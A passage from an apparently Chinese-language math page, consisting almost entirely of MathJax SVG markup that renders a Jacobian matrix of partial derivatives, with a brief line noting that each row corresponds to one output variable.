347 0H338V62H366Q366 63 326 112T285 163L198 63L217 62H235V0H227Z\"/></g></g></g><rect width=\"1373\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(3857.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mrow\" transform=\"translate(4913.1,0)\"><g data-mml-node=\"mo\"><path data-c=\"23A1\" d=\"M319 -645V1154H666V1070H403V-645H319Z\" transform=\"translate(0,1828.7)\"/><path data-c=\"23A3\" d=\"M319 -644V1155H403V-560H666V-644H319Z\" transform=\"translate(0,-1838.7)\"/><svg width=\"667\" height=\"2067.4\" y=\"-783.7\" x=\"0\" viewbox=\"0 516.8 667 2067.4\"><path data-c=\"23A2\" d=\"M319 0V602H403V0H319Z\" transform=\"scale(1,5.151)\"/></svg></g><g data-mml-node=\"mtable\" transform=\"translate(667,0)\"><g data-mml-node=\"mtr\" transform=\"translate(0,1992.1)\"><g data-mml-node=\"mtd\" transform=\"translate(65.5,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(249,485) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><rect width=\"1313.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(2739.4,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(5006.9,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(274,485) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D45B\" d=\"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z\"/></g></g></g><rect width=\"1363.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,-385)\"><g data-mml-node=\"mtd\" transform=\"translate(703.2,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(2684.4,0)\"><g data-mml-node=\"mo\"><path data-c=\"22F1\" d=\"M133 760Q133 784 150 802T193 820Q217 820 235 804T254 761Q254 736 237 718T194 700T151 717T133 760ZM580 460Q580 484 597 502T640 520Q664 520 682 504T701 461Q701 436 684 418T641 400T598 417T580 460ZM1027 160Q1027 184 1044 202T1087 220Q1111 220 1129 204T1148 161Q1148 136 1131 118T1088 100T1045 117T1027 160Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(5669.6,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,-2025.5)\"><g data-mml-node=\"mtd\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(220,485) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(285.5,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><rect width=\"1444.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(2739.4,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(4966.4,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(220,485) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(260.5,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D45B\" d=\"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z\"/></g></g></g><rect width=\"1444.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(7317.8,0)\"><path data-c=\"23A4\" d=\"M0 1070V1154H347V-645H263V1070H0Z\" transform=\"translate(0,1828.7)\"/><path data-c=\"23A6\" d=\"M263 -560V1155H347V-644H0V-560H263Z\" transform=\"translate(0,-1838.7)\"/><svg width=\"667\" height=\"2067.4\" y=\"-783.7\" x=\"0\" viewbox=\"0 516.8 667 2067.4\"><path data-c=\"23A5\" d=\"M263 0V602H347V0H263Z\" transform=\"scale(1,5.151)\"/></svg></g></g><g data-mml-node=\"mo\" transform=\"translate(13175.7,0)\"><path data-c=\"2208\" d=\"M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(14120.5,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"211D\" d=\"M17 665Q17 672 28 683H221Q415 681 439 677Q461 673 481 667T516 654T544 639T566 623T584 607T597 592T607 578T614 565T618 554L621 548Q626 530 626 497Q626 447 613 419Q578 348 473 326L455 321Q462 310 473 292T517 226T578 141T637 72T686 35Q705 30 705 16Q705 7 693 -1H510Q503 6 404 159L306 310H268V183Q270 67 271 59Q274 42 291 38Q295 37 319 35Q344 35 353 28Q362 17 353 3L346 -1H28Q16 5 16 16Q16 35 55 35Q96 38 101 52Q106 60 106 341T101 632Q95 645 55 648Q17 648 17 665ZM241 35Q238 42 237 45T235 78T233 163T233 337V621L237 635L244 648H133Q136 641 137 638T139 603T141 517T141 341Q141 131 140 89T134 37Q133 36 133 35H241ZM457 496Q457 540 449 570T425 615T400 634T377 643Q374 643 339 648Q300 648 281 635Q271 628 270 610T268 481V346H284Q327 346 375 352Q421 364 439 392T457 496ZM492 537T492 496T488 427T478 389T469 371T464 361Q464 360 465 360Q469 360 497 370Q593 400 593 495Q593 592 477 630L457 637L461 626Q474 611 488 561Q492 537 492 496ZM464 243Q411 317 410 317Q404 317 401 315Q384 315 370 312H346L526 35H619L606 50Q553 109 464 243Z\"/></g></g><g data-mml-node=\"TeXAtom\" transform=\"translate(755,413) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(878,0)\"><path data-c=\"D7\" d=\"M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1656,0)\"><path data-c=\"1D45B\" d=\"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z\"/></g></g></g></g></g></svg></mjx-container></span> 每行是一个输出变量 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.464ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.848ex\" height=\"1.464ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 817 647\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 